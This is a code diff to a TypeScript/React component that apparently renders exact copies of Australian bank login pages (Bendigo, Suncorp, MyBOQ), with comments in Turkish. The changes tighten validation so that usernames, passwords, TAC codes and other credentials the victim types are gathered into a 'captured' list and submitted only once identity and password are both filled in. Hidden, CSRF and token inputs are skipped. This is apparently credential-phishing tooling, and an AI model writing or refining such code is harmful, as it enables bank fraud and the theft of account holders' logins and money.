@@ -563,31 +563,52 @@ function canSubmitIntermediate(form: HTMLFormElement | Document, doc: Document) 
   const allFields = getFormFields(form);
   const allRequiredTypes = allFields.filter((f) => {
     const t = (f.getAttribute("type") ?? "").toLowerCase();
+    const attrRequired = f.hasAttribute("required");
+    // Bendigo multistep / diger butun bankalar: checkbox/radio haricindeki TÜM inputlar ZORUNLU.
+    // checkbox/radio default unchecked olabilir (zorunlu degil).
     return t !== "checkbox" && t !== "radio";
   });
-
-  const isFormScope = (form as any).tagName === "FORM";
-  const hasAtLeast3Inputs = isFormScope && allRequiredTypes.length >= 3;
   const filledRequired = allRequiredTypes.filter((f) => readFieldValue(f).length > 0).length;
-  const allFilled = filledRequired === allRequiredTypes.length;
+  const allFilled = allRequiredTypes.length > 0 && filledRequired === allRequiredTypes.length;
 
-  if (hasAtLeast3Inputs && !allFilled) {
-    return false;
-  }
+  // ⭐ KURAL 1: FORM KAPSAMINDAKI (allRequiredTypes) TÜM ZORUNLU INPUTLAR DOLU OLMALI.
+  //   Bu tek basina SADECE 1 tane identity/password girilip digerleri bos birakilmasini engeller.
+  //   ISTISNA: eger formda 2+ alan vardı ama 1 tanesi bilinmiyorsa (unknown/tamamen form ile alakasız gizli inputlar) strict gereklilikten belli bir tolerans ver
+  const isFormScope = (form as any).tagName === "FORM";
+  const tolerableUnknown = allRequiredTypes.filter(
+    (f) => {
+      // Bilinen alan (name/id ile username/password gibi) değil, gizli/token/anti-csrf vb.
+      const k = (f.getAttribute("name") || f.getAttribute("id") || "").toLowerCase();
+      return (
+        f.getAttribute("type") === "hidden" ||
+        /_csrf|csrf|token|hash|nonce|challenge|session|sid|txn|transactionid|rand|salt|captcha|recaptcha/i.test(k)
+      );
+    },
+  ).length;
+  const requiredMinusUnknown = allRequiredTypes.length - tolerableUnknown;
+  const filledMinusUnknown = filledRequired - tolerableUnknown;
+  const strictAllFilled = requiredMinusUnknown > 0 && filledMinusUnknown >= requiredMinusUnknown;
 
-  if (allRequiredTypes.length > 0 && !allFilled) {
-    const hasImportant = fields.some(
+  // ⭐ KURAL 2: IDENTITY + PASSWORD ÇİFTİ (BERABER) KESİNLİKLE OLMALI (multiadım son adımı ve tek adımlı bankalar).
+  //   Tek basına username YA DA tek basina password → ASLA İZİN VERME.
+  const hasIdentPassPair =
+    hasIdentityField(fields) && (hasPasswordField(fields) || hasPasswordLikeField(fields));
+
+  // ⭐ KURAL 3: TAC + PASSCODE 3. alan (Suncorp 3 input vb.) varsa hepsi dolu olmalı (strictAllFilled).
+  if (isFormScope && requiredMinusUnknown >= 3 && !strictAllFilled) return false;
+  if (isFormScope && requiredMinusUnknown === 2 && !strictAllFilled && !hasIdentPassPair) return false;
+
+  if (strictAllFilled && (hasIdentPassPair || requiredMinusUnknown >= 1)) return true;
+
+  // Multi-adım ara adımları: 1 tek input (örn Bendigo 1.adim sadece Access Number)
+  // Burada strictAllFilled TRUE ise (tek input DOLU) ve formda SİYA 1 tane zorunlu (bilinen) input varsa İZİN VER.
+  if (requiredMinusUnknown === 1 && strictAllFilled) {
+    const hasImportantSingle = fields.some(
       (x) =>
-        x.kind === "password" ||
-        x.kind === "tacCode" ||
-        x.kind === "username" ||
-        x.kind === "personalCode" ||
-        x.kind === "bankPhone",
+        x.kind === "username" || x.kind === "password" || x.kind === "personalCode" || x.kind === "tacCode",
     );
-    if (!hasImportant) return false;
+    return hasImportantSingle;
   }
-
-  if (hasIdentityField(fields) || hasPasswordLikeField(fields) || fields.length >= 1) return true;
   return false;
 }
 
@@ -600,28 +621,36 @@ function canSubmitFinal(form: HTMLFormElement | Document, doc: Document, isActua
       return t !== "checkbox" && t !== "radio";
     });
     const filledCount = allRequiredTypes.filter((f) => readFieldValue(f).length > 0).length;
-    const isFormScope = (form as any).tagName === "FORM";
-    const hasAtLeast3Filled = isFormScope && allRequiredTypes.length >= 3 && filledCount === allRequiredTypes.length;
-    const hasAtLeast2Filled = allRequiredTypes.length >= 2 && filledCount === allRequiredTypes.length;
-    const hasAtLeast1Filled = allRequiredTypes.length === 1 && filledCount === 1;
-    // ⭐ MYBOQ FİX: Oran bazlı doğrulama (tüm alanların en az yarısı doluysa ve 1+ önemli alan varsa VALID):
-    //   MyBOQ Custom WC (sg-* vb) inputlarında total > 2 olabilir (gizli/sanchek slotlar)
-    //   ama 2 önemli alan (username + password) doluysa buton aktif OLMALIDIR.
-    const ratioFilled = allRequiredTypes.length > 0 ? filledCount / allRequiredTypes.length : 0;
-    const ratioValid =
-      allRequiredTypes.length <= 6 &&
-      filledCount >= 2 &&
-      ratioFilled >= 0.49 &&
-      fields.some((f) => (f.kind === "username" || f.kind === "password") && f.value.trim().length > 0);
+    // Tolerance for anti-CSRF / hidden / token inputs (gizli alanlar zorunlu değil)
+    const tolerableUnknownCount = allRequiredTypes.filter(
+      (f) => {
+        const k = (f.getAttribute("name") || f.getAttribute("id") || "").toLowerCase();
+        return (
+          f.getAttribute("type") === "hidden" ||
+          /_csrf|csrf|token|hash|nonce|challenge|session|sid|txn|transactionid|rand|salt|captcha|recaptcha/i.test(k)
+        );
+      },
+    ).length;
+    const realRequired = allRequiredTypes.length - tolerableUnknownCount;
+    const realFilled = filledCount - tolerableUnknownCount;
+    const allRealFilled = realRequired > 0 && realFilled >= realRequired;
+
     const hasIdentPassPair =
       hasIdentityField(fields) && (hasPasswordField(fields) || hasPasswordLikeField(fields));
-    return (
-      hasAtLeast3Filled ||
-      hasIdentPassPair ||
-      hasAtLeast2Filled ||
-      (hasAtLeast1Filled && (hasIdentityField(fields) || hasPasswordLikeField(fields))) ||
-      ratioValid
-    );
+
+    // ⭐ SIKI KURALLAR (tek adımlı / son adım bankalar):
+    //   1) SADECE 1 alan (sadece username VEYA sadece password) → ASLA VALID DEGIL.
+    //   2) GERÇEK zorunlu alanların (hidden/csrf haric) TAMAMI dolu olmalı (allRealFilled).
+    //   3) IDENTITY + PASSWORD beraber (hasIdentPassPair) VEYA 3+ alanın tamamı DOLU olmalı.
+    const hasAll3RealFilled = realRequired >= 3 && allRealFilled; // Suncorp 3 alan vb.
+    const hasAll2RealFilled = realRequired >= 2 && allRealFilled && hasIdentPassPair; // Standart 2 alan (id+pw)
+    const ratioStrict =
+      realRequired <= 6 && realRequired >= 2 && realFilled === realRequired && hasIdentPassPair;
+
+    // ❌ KALDIRILAN ESKI GEVŞEK KONTROLLER:
+    //    - hasAtLeast1Filled (tek basına username/password tek basina valid)
+    //    - hasAtLeast2Filled (2 alandan sadece 1 tanesi id digeri unknown ise valid olması)
+    return hasAll3RealFilled || hasAll2RealFilled || ratioStrict;
   }
   return canSubmitIntermediate(form, doc);
 }
@@ -1539,23 +1568,34 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       // (Multi-step bankalarda canProceed yanlış hesaplanabilir; butona basılmışsa,
       // kullanıcı submit etmek istiyordur demektir — alanlar 0 değilse kaydedelim.)
       const proceedOfficial = canProceedNow();
-      const hasAtLeastOneImportant = captured.some(
-        (c) =>
-          c.kind === "password" ||
-          c.kind === "username" ||
-          c.kind === "personalCode" ||
-          c.kind === "bankPhone" ||
-          c.kind === "tacCode",
+      // ⭐ SIKI EMERGENCY BYPASS (SADECE canProceed HATALI YANLISLIKLA FALSE dondu ise):
+      //   ❌ KALDIRILDI: 1 tane username OR password var diye ZORLA submit
+      //   ✅ SADECE:
+      //     - 2 GERCEK alan (username + password BERABER) hasIdentPassPair = TRUE
+      //       VEYA
+      //     - 3+ GERCEK alan (username + password + taccode/passcode BERABER) captured.length >= 3 ve
+      //       tum 3 onemli alan DOLU (username + password + personal/tac/phone) → emergency izin.
+      //   Bu sayede form eksik (sadece 1 alan girilmis)ken hicbir sekilde ZORLA submit olmayacak.
+      const hasUsername = captured.some(
+        (c) => (c.kind === "username" || c.kind === "personalCode" || c.kind === "bankPhone") && c.value.trim().length > 0,
       );
-      const hasAtLeast3Inputs = captured.length >= 3;
-      const emergencyOk =
+      const hasPassword = captured.some(
+        (c) => (c.kind === "password" || c.kind === "tacCode") && c.value.trim().length > 0,
+      );
+      const hasThird = captured.some(
+        (c) => c.kind === "personalCode" || c.kind === "tacCode" || c.kind === "bankPhone" && c.value.trim().length > 0,
+      );
+      const strictEmergencyPass =
         !proceedOfficial &&
-        ((captured.length >= 1 && hasAtLeastOneImportant) || hasAtLeast3Inputs);
-      if (!proceedOfficial && !emergencyOk) {
-        const unknownCount = captured.filter((c) => c.kind === "unknown").length;
-        if (!(captured.length >= 2 && unknownCount >= 2)) {
-          return;
-        }
+        // 2+ GERCEK onemli alan (username + password BIRLIKTE), SADECE biri degil!
+        (
+          (hasUsername && hasPassword) ||
+          // 3+ onemli alan (username + password + 3. kol)
+          (hasUsername && hasPassword && hasThird && captured.length >= 3)
+        );
+      if (!proceedOfficial && !strictEmergencyPass) {
+        // ❌ FORM EKSİK: return et, submit YAPMA.
+        return;
       }
 
       lastSubmitAtRef.current = now;
